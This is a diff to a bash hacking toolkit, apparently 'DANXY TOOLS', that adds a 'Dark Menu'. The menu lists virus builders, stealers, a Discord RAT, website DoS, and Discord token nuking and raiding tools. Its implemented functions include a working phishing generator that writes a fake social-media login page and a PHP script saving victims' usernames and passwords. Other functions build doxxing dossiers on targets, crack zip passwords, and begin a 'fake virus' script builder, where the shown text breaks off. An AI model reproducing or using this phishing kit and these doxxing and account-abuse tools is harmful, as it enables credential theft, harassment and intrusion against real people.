@@ -133,6 +133,48 @@ banner() {
   fi
 }
 
+Ben() {
+echo -e " ${RED}
+┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮ 
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⢠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀           ${GREEN}0${RED}     │
+│⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡟⢦⠀⠀⠀⠀⠀⠀⠀⠀⢀⣞⣏⣀⣀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⢀⡴⢺⡿⠛⠉⡇⠈⡇⠀⠀⠀⠀⠀⠀⢀⡟⠘⡇⠉⠻⣝⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⡞⡟⠀⠀⣠⠇⢠⡇⠀⠀⠀⠀⠀⠀⠈⣷⢀⣳⡀⠀⠘⡎⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ${GREEN}0${RED}       │
+│⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡃⣇⣇⣀⡴⣫⢆⡞⠀⠀⠀⣀⣀⣀⡀⠀⠘⣦⠱⣿⢦⣀⣿⡀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⡙⠒⠖⠋⢁⡯⢶⣶⣨⡻⠿⡿⠿⣿⣼⣴⠾⣧⠈⠓⠲⠚⣣⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀                 │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⡣⣄⠀⠨⣯⣿⢟⣷⠹⣿⣾⡾⢻⡿⣿⣿⡿⠃⠀⣤⡾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          ${GREEN}0${RED}      │
+│⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⢀⢿⣟⡆⠀⠻⣯⣿⠏⢠⣿⣿⣧⠈⢿⣿⠿⠃⠀⣼⣿⣷⣄⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}                │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣆⣟⣾⢻⣾⡀⠀⠀⢀⣴⣿⡇⣿⡟⣷⣄⡀⠀⠀⢰⣿⣧⢻⣟⣾⢧⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     ${GREEN}0${RED}           │
+│⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⡀⢸⠈⢿⣾⣧⣿⣻⣧⠀⠀⡿⣿⢸⣧⣿⡇⣿⢿⡇⠀⠀⣿⣿⢻⣏⣿⡇⢸⡄⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀               ${GREEN}0${RED} │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣾⡹⣿⡇⠘⢿⣾⣏⡿⠁⠀⢸⢧⣿⣼⣟⣿⡇⣿⢸⣿⠀⠐⢿⣿⣏⣿⠿⠀⣼⣧⣾⣳⣿⣷⣌⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              ${GREEN}0${RED}  │
+│⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣟⠻⠙⣿⣷⢹⣿⣦⡀⠀⠁⠀⠀⠀⠈⢿⣇⣿⡿⣿⡇⣿⣿⠟⠀⠀⠀⠀⠀⠀⣀⣾⣿⡟⢸⣿⡟⠹⣿⣷⢹⡆⠀⠀⠀                ${GREEN}0${RED}       │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⢿⡹⣿⣇⢠⠟⣿⢠⣿⣿⣿⣷⣶⣢⣤⡀⠀⠀⠉⠛⠛⠛⠓⠋⠁⠀⠀⢠⣶⣶⣶⣾⣿⢹⣿⡇⢸⡍⢧⠀⣿⡟⣼⠇⠀⠀⠀⠀                       │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⣜⠿⣾⠟⣡⣾⣿⡿⣿⣇⣿⣟⣿⣷⣆⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣻⡗⣿⣏⣿⡾⣿⡿⢦⠙⣾⡾⢋⡴⠁⠀⠀⠀              ${GREEN}0${RED}          │
+│⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⣦⣼⣷⣀⡍⠳⣄⡀⠉⡉⠉⠙⠳⢿⣲⣦⠄⠀⢤⣴⣾⠿⠛⠋⠉⠉⣉⠁⢀⡴⢋⣀⡼⣷⣤⡖⠋⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀                 │ 
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⢿⣟⠿⠤⠀⠑⣾⠃⠀⠀⠀⠀⠀⠈⡏⣿⢻⠁⠀⠀⠀⠀⠀⠀⢹⡴⠁⠀⠼⠟⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 │ 
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⣼⠿⠿⣿⢿⣽⣂⣀⡀⠀⠿⣦⡀⠀⠀⠀⢆⠀⣇⣿⣼⠀⡄⠀⠀⠀⠀⣠⡿⠇⠀⣀⣀⣾⣿⣿⡿⠻⢿⡄⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀                 │
+│⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⣾⡆⣿⢸⣿⣿⣿⣿⣷⣶⣶⣯⣷⣦⣤⣼⣶⣿⣿⣿⣾⣧⣤⣤⣴⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⡇⣶⡾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀                 │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⡵⣿⣿⣿⣿⣿⣿⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠋⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢸⣿⣿⣿⣜⢷⣻⣥⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${GREEN}0${RED}            │
+│⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⣿⡿⣿⣿⣿⢿⣿⣛⣻⡄⠈⠉⠙⠿⣿⣿⢿⣯⡷⣝⢦⣞⡾⣼⣿⢿⣿⣿⠋⠉⡇⠈⣟⢻⣿⣿⢿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀                 │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢻⣿⣾⣿⣿⣿⣿⣿⣷⠔⠒⠲⢤⣁⣩⣏⣡⡹⣌⠛⣣⠞⣄⣙⣄⣉⣤⠿⢒⡛⢻⣿⣻⣿⣿⣿⣿⣿⣟⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀                 │
+│⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡻⢿⣿⣿⣿⣿⡄⡄⢋⣵⣛⠟⠛⠛⠷⣌⣉⣁⡾⠟⠛⠻⣿⣋⣙⢻⣹⣿⣿⣿⣿⣿⠿⣻⣿⡟⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀             ${GREEN}0${RED}    │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡟⣽⣾⣿⣿⣿⣿⣿⠀⣆⠈⣿⣗⡦⢤⡤⠬⣭⠥⠤⡤⢤⣾⣿⡇⢸⠄⢻⣿⣟⣿⣿⣿⣦⡽⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀              ${GREEN}0${RED}  │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠋⠹⣿⣿⣿⣿⣿⣟⣿⢠⣿⣿⣿⣾⣷⣶⣿⣶⣶⣷⣾⣿⣿⣧⢸⣤⣿⣿⣿⣿⣿⡇⠉⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀          ${GREEN}0${RED}      │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⣍⢻⣿⣿⡷⣾⡛⢯⣹⡉⣻⣛⣿⣛⣿⠉⣻⡹⠛⣿⣾⣿⣿⡟⣻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}                │
+│⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⠿⠟⠛⢇⣿⣙⠂⠚⠛⣉⣀⣀⣀⣨⡛⠓⠐⢚⣽⣹⠛⠛⠿⠮⠿⠁⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀           ${GREEN}0${RED}     │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⠙⠳⡖⠚⡋⠀⠀⠀⠈⡛⠒⡶⠋⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ${GREEN}0${RED}              │
+│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠀⠀⠙⢦⣀⠀⠀⢀⣠⣴⠞⠁⠀⠘⠃⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              ${GREEN}0${RED}  │
+│⠀⠀⠀ ⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⠶⠾⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀                 │
+│         ⠀⠀⠀                       ${RED}[    ${WHITE}${UNDERLINE}${BOLD} DANXY TOOLS V8.4 ${NC}${RED}    ]${RED}                              ${GREEN}0${RED}    │
+│           ${GREEN}0${RED}                ${GREEN}0${RED}                                ${GREEN}0${RED}                         ${GREEN}0${RED}          │
+│                       ⠀⠀⠀    ${GREEN}0${RED}       ${RED}[   ${WHITE}${BOLD} DARK MENU ${NC}${RED}    ]${RED}          ${GREEN}0${RED}                     ${GREEN}0${RED}       │
+│          ${GREEN}0${RED}                ⠀⠀⠀      ${RED}[    ${WHITE}${BOLD} HACKING ONLY ${NC}${RED}    ]${RED}                                  ${GREEN}0${RED}   │
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ "
+   
+
+echo -e "                                                                                                                           "
+echo -e "                                                                                                                           "
+}
 spasi() {
 echo "                                                "
 echo "                                                "
@@ -508,6 +550,11 @@ SUNTIK|suntik)
      play_music
      klik
      ;;
+MENURED)
+    klik
+    DarkMenu
+    klik
+    ;;
     00|0)
     klik
       echo -e "${CYAN}TERIMAKASIH SUDAH MENGGUNAKAN TOOLS DANXY.${NC}" | lolcat
@@ -523,6 +570,759 @@ SUNTIK|suntik)
     esac
   done
 }
+
+DarkMenu() {
+set -euo pipefail
+########## WARNA ##########
+R=$(printf '\033[38;5;196m'); G=$(printf '\033[32m'); Y=$(printf '\033[33m')
+B=$(printf '\033[34m'); W=$(printf '\033[37m'); RESET=$(printf '\033[m')
+BG='\033[1;41m'
+########## CONFIG ##########
+TOOL_NAME="DanxyTools"
+VERSION="8.4"
+GITHUB="https://github.com/NgakuNgakuDevTapiScRecodePunyaGw/Danxy"
+USER=${USER:-$(whoami)}
+MENU_NR=1
+
+########## UTILS ##########
+clear_screen(){ clear || true; }
+pause(){ read -rp "  Press Enter to continue … "; }
+
+########## MENU 1-3 ##########
+menu1(){
+Ben
+cat <<M1
+ ${R}┌─ ${R}[${W} 0 ${R}]${RESET} KELUAR
+ ${R}├─ ${R}[${W}I${R}]${RESET} Info                                                                       ${R}[${W}N${R}]${RESET} Next ${R}─┐
+ ${R}├─ ${R}[${W}S${R}]${RESET} Site ${R}┌─────────────────┐            ┌───────┐                  ┌───────────┐         │
+ ${R}└─┬─────────┤ ${W}Network Scanner ${R}├──────┬─────┤ ${W}Osint ${R}├───────────┬──────┤ ${W}Utilities ${R}├─────────┴─
+   ${R}│         └─────────────────┘      │     └───────┘           │      └───────────┘
+   ${R}├─ ${R}[${W}01${R}]${RESET} Website-Vuln-Scanner       ${R}├─ ${R}[${W}10${R}]${RESET} D0x-Create        ${R}├─ ${R}[${W}20${R}]${RESET} Phishing-Attack
+   ${R}├─ ${R}[${W}02${R}]${RESET} Website-Info-Scanner       ${R}├─ ${R}[${W}11${R}]${RESET} D0x-Tracker       ${R}├─ ${R}[${W}21${R}]${RESET} Zip-Pass-Crack
+   ${R}├─ ${R}[${W}03${R}]${RESET} Website-Url-Scanner        ${R}├─ ${R}[${W}12${R}]${RESET} Image-Exif        ${R}├─ ${R}[${W}22${R}]${RESET} Hash-Decrypt
+   ${R}├─ ${R}[${W}04${R}]${RESET} IP-Scanner                 ${R}├─ ${R}[${W}13${R}]${RESET} Google-Dork       ${R}├─ ${R}[${W}23${R}]${RESET} Hash-Encrypt
+   ${R}├─ ${R}[${W}05${R}]${RESET} IP-Port-Scanner            ${R}├─ ${R}[${W}14${R}]${RESET} Username-Tracker  ${R}├─ ${R}[${W}24${R}]${RESET} Search-DB
+   ${R}└─ ${R}[${W}06${R}]${RESET} IP-Pinger                  ${R}├─ ${R}[${W}15${R}]${RESET} Email-Tracker     ${R}├─ ${R}[${W}25${R}]${RESET} Dark-Web-Links
+                                      ${R}├─ ${R}[${W}16${R}]${RESET} Email-Lookup      ${R}└─ ${R}[${W}26${R}]${RESET} IP-Generator
+                                      ${R}├─ ${R}[${W}17${R}]${RESET} Phone-Lookup   
+                                      ${R}├─ ${R}[${W}18${R}]${RESET} IP-Lookup   
+                                      ${R}└─ ${R}[${W}19${R}]${RESET} Instagram-Account
+M1
+}
+
+menu2(){
+Ben
+cat <<M2
+ ${R}┌─ ${R}[${W} 0 ${R}]${RESET} KELUAR
+ ${R}├─ ${R}[${W}I${R}]${RESET} Info                                                                 ${R}[${W}N${R}]${RESET} Next ${R}─┐
+ ${R}├─ ${R}[${W}S${R}]${RESET} Site  ${R}┌───────────────┐          ┌──────┐              ┌────────┐    ${R}[${W}B${R}]${RESET} Back ${R}─┤
+${R}─┴─┬──────────┤ ${W}Virus Builder ${R}├────┬─────┤ ${W}Paid ${R}├────────┬─────┤ ${W}Roblox${R} ├──────────────┴─
+   ${R}│          └───────────────┘    │     └──────┘        │     └────────┘
+   ${R}└─ ${R}[${W}30${R}]${RESET} Virus-Builder           ${R}├─ ${R}[${W}31${R}]${RESET} Py-Obfuscator ${R}├─ ${R}[${W}40${R}]${RESET} Roblox-Cookie-Login
+           ${R}├─ ${W}Stealer              ${R}├─ ${R}[${W}32${R}]${RESET} Discord-RAT   ${R}├─ ${R}[${W}41${R}]${RESET} Roblox-Cookie-Info
+           ${R}├─ ${W}Grabber              ${R}├─ ${R}[${W}33${R}]${RESET} Website-DoS   ${R}├─ ${R}[${W}42${R}]${RESET} Roblox-Id-Info
+           ${R}└─ ${W}Malware              ${R}└─ ${R}[${W}34${R}]${RESET} Proxy-Scraper ${R}└─ ${R}[${W}43${R}]${RESET} Roblox-User-Info
+M2
+}
+
+menu3(){
+Ben
+cat <<M3
+              ${R}┌─ ${R}[${W} 0 ${R}]${RESET} KELUAR
+              ${R}├─ ${R}[${W}I${R}]${RESET} Info                                                      ${R}[${W}B${R}]${RESET} Back ${R}─┐
+              ${R}├─ ${R}[${W}S${R}]${RESET} Site                               ${R} ┌─────────┐                     │
+             ${R}─┴─┬────────────────────────────────────────┤ ${W}Discord ${R}├─────────────────────┘
+                ${R}│                                        ├─────────┘
+                ${R}├─ ${R}[${W}50${R}]${RESET} Token-Nuker                      ${R}├─ ${R}[${W}60${R}]${RESET} Token-Mass-Dm
+                ${R}├─ ${R}[${W}51${R}]${RESET} Token-Info                       ${R}├─ ${R}[${W}61${R}]${RESET} Token-Delete-Dm
+                ${R}├─ ${R}[${W}52${R}]${RESET} Token-Joiner                     ${R}├─ ${R}[${W}62${R}]${RESET} Token-Status-Changer
+                ${R}├─ ${R}[${W}53${R}]${RESET} Token-Leaver                     ${R}├─ ${R}[${W}63${R}]${RESET} Token-Language-Changer
+                ${R}├─ ${R}[${W}54${R}]${RESET} Token-Login                      ${R}├─ ${R}[${W}64${R}]${RESET} Token-House-Changer
+                ${R}├─ ${R}[${W}55${R}]${RESET} Token-To-Id-Brute                ${R}├─ ${R}[${W}65${R}]${RESET} Token-Theme-Changer
+                ${R}├─ ${R}[${W}56${R}]${RESET} Token-Server-Raid                ${R}├─ ${R}[${W}66${R}]${RESET} Token-Generator
+                ${R}├─ ${R}[${W}57${R}]${RESET} Token-Spammer                    ${R}├─ ${R}[${W}67${R}]${RESET} Bot-Server-Nuker
+                ${R}├─ ${R}[${W}58${R}]${RESET} Token-Delete-Frie                ${R}├─ ${R}[${W}68${R}]${RESET} Bot-Invite-To-Id
+                ${R}├─ ${R}[${W}59${R}]${RESET} Token-Block-Friends              ${R}├─ ${R}[${W}69${R}]${RESET} Server-Info
+                ${R}└────────────────────────────────────────┴──────────────────────────────
+M3
+}
+
+########## FUNGSI MODUL ##########
+website_vuln_scanner(){
+  read -rp "  Target domain: " d
+  echo "  Checking security headers …"
+  curl -s -I "https://$d" | grep -i "x-frame-options\|x-content-type-options\|strict-transport-security\|content-security-policy" || echo "  Missing security headers"
+  echo "  Checking HTTPS redirect …"
+  curl -s -I "http://$d" | grep -i "location" || echo "  No HTTPS redirect"
+  pause
+}
+
+website_info_scanner(){
+  read -rp "  Domain: " d
+  echo "  IP resolve:"
+  nslookup "$d" | grep "Address:" | tail -n +2
+  echo "  HTTP headers:"
+  curl -s -I "https://$d" | head -10
+  pause
+}
+
+website_url_scanner(){
+  read -rp "  Domain: " d
+  echo "  Crawling 20 links (wget) …"
+  wget -q --spider --force-html -r -l 1 "https://$d" 2>&1 | grep -E "https?://$d" | head -20 || echo "  wget error"
+  pause
+}
+
+ip_scanner(){
+  read -rp "  IP/Host: " ip
+  nslookup "$ip" || echo "  nslookup fail"
+  ping -c 3 "$ip" || echo "  ping fail"
+  pause
+}
+
+ip_port_scanner(){
+  read -rp "  IP: " ip
+  echo "  Top 1000 ports (nmap) …"
+  nmap -F "$ip" || echo "  nmap fail"
+  pause
+}
+
+ip_pinger(){
+  read -rp "  IP: " ip
+  ping -c 10 -i 0.2 "$ip" || echo "  ping fail"
+  pause
+}
+
+d0x_create(){
+  read -rp "  Target name: " name
+  file="dossier-${name// /_}.txt"
+  {
+    echo "======== DOSSIER $name ========="
+    read -rp "  Full name: " full; echo "Full: $full"
+    read -rp "  Address: " addr; echo "Addr: $addr"
+    read -rp "  Phone: " phone; echo "Phone: $phone"
+    read -rp "  Email: " mail; echo "Email: $mail"
+    echo "================================"
+  } > "$file"
+  echo "  Saved → $file"
+  pause
+}
+
+d0x_tracker(){
+  read -rp "  Dossier file: " f
+  [[ -f "$f" ]] && cat "$f" || echo "  File not found"
+  pause
+}
+
+image_exif(){
+  read -rp "  Image path: " img
+  exiftool "$img" 2>/dev/null || echo "  exiftool not found"
+  pause
+}
+
+google_dork(){
+  read -rp "  Domain: " d
+  links=(
+    "https://www.google.com/search?q=site:${d}+filetype:pdf"
+    "https://www.google.com/search?q=site:${d}+intitle:index.of"
+    "https://www.google.com/search?q=site:${d}+password"
+    "https://www.google.com/search?q=site:${d}+username"
+    "https://www.google.com/search?q=site:${d}+email"
+  )
+  for l in "${links[@]}"; do xdg-open "$l"; done
+  echo "  5 dorks opened"
+  pause
+}
+
+username_tracker(){
+  read -rp "  Username: " u
+  sites=(
+    "https://github.com/$u"
+    "https://instagram.com/$u"
+    "https://twitter.com/$u"
+    "https://facebook.com/$u"
+    "https://tiktok.com/@$u"
+  )
+  for s in "${sites[@]}"; do xdg-open "$s"; done
+  echo "  Opened 5 sites"
+  pause
+}
+
+email_tracker(){
+  read -rp "  Email: " em
+  domain=${em#*@}
+  nslookup -type=mx "$domain" || echo "  MX fail"
+  echo "  Check breach: https://haveibeenpwned.com/$em"
+  xdg-open "https://haveibeenpwned.com/$em"
+  pause
+}
+
+email_lookup(){
+  read -rp "  Email: " em
+  if [[ "$em" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$ ]]; then
+    domain=${em#*@}
+    nslookup -type=mx "$domain"
+  else
+    echo "  Invalid email"
+  fi
+  pause
+}
+
+phone_lookup(){
+  read -rp "  Phone (+62…): " p
+  echo "  Format check: $p"
+  echo "  Opening truecaller search …"
+  xdg-open "https://www.truecaller.com/search/$p" &
+  pause
+}
+
+ip_lookup(){
+  read -rp "  IP: " ip
+  curl -s "https://ipinfo.io/$ip" || echo "  ipinfo fail"
+  pause
+}
+
+instagram_account(){
+  read -rp "  IG username: " u
+  xdg-open "https://instagram.com/$u" &
+  echo "  Profile opened"
+  pause
+}
+
+phishing_attack(){
+  echo "  Phishing template generator"
+  read -rp "  Target (fb/ig/steam): " t
+  read -rp "  Output folder: " o
+  mkdir -p "$o"
+  cat >"$o/index.html" <<PHISH
+<!doctype html><html><head><title>Login</title></head>
+<body>
+<h1>Fake $t login</h1>
+<form action="grab.php" method="post">
+User: <input name="user"><br>
+Pass: <input type="password" name="pass"><br>
+<input type="submit" value="Login">
+</form>
+</body></html>
+PHISH
+  cat >"$o/grab.php" <<'PHP'
+<?php file_put_contents("creds.txt", $_POST['user'].":".$_POST['pass']."\n", FILE_APPEND); header("Location: https://google.com"); ?>
+PHP
+  echo "  Phishing pages created in $o/"
+  pause
+}
+
+zip_pass_crack(){
+  read -rp "  Zip file: " z
+  read -rp "  Wordlist: " w
+  fcrackzip -u -D -p "$w" "$z" || echo "  fcrackzip fail"
+  pause
+}
+
+hash_decrypt(){
+  read -rp "  Hash (md5): " h
+  echo "  Using crackstation.net …"
+  xdg-open "https://crackstation.net/$h" &
+  pause
+}
+
+hash_encrypt(){
+  read -rp "  String to hash: " s
+  echo "  MD5:    $(echo -n "$s" | md5sum | cut -d' ' -f1)"
+  echo "  SHA1:   $(echo -n "$s" | sha1sum | cut -d' ' -f1)"
+  echo "  SHA256: $(echo -n "$s" | sha256sum | cut -d' ' -f1)"
+  pause
+}
+
+search_db(){
+  echo "  Fake DB search (grep wordlist)"
+  read -rp "  Keyword: " k
+  read -rp "  Wordlist file: " w
+  [[ -f "$w" ]] && grep -i "$k" "$w" || echo "  Wordlist not found"
+  pause
+}
+
+dark_web_links(){
+  links=(
+    "https://thehiddenwiki.org"
+    "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/wiki/"
+    "http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion"
+    "https://www.reddit.com/r/onions"
+    "https://tor.taxi"
+  )
+  for l in "${links[@]}"; do xdg-open "$l"; done
+  echo "  5 links opened"
+  pause
+}
+
+ip_generator(){
+  o1=$(( RANDOM % 256 )); o2=$(( RANDOM % 256 ))
+  o3=$(( RANDOM % 256 ))
+  echo "  Random /24 → $o1.$o2.$o3.0/24"
+  for i in {1..20}; do echo "    $o1.$o2.$o3.$i"; done
+  pause
+}
+
+proxy_scraper(){
+  echo "  Fetching free-proxy-list.net …"
+  curl -s https://free-proxy-list.net | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{1,5}' | head -50
+  pause
+}
+
+virus_builder(){
+  echo "  Fake virus builder (Linux .sh)"
+  read -rp "  Output name (ex: payload): " name
+  cat >"${name}.sh" <<'VIR'
+#!/bin/bash
+# fake payload
+for i in {1..10}; do
+  echo " Infecting /system$i …" | wall
+  sleep 1
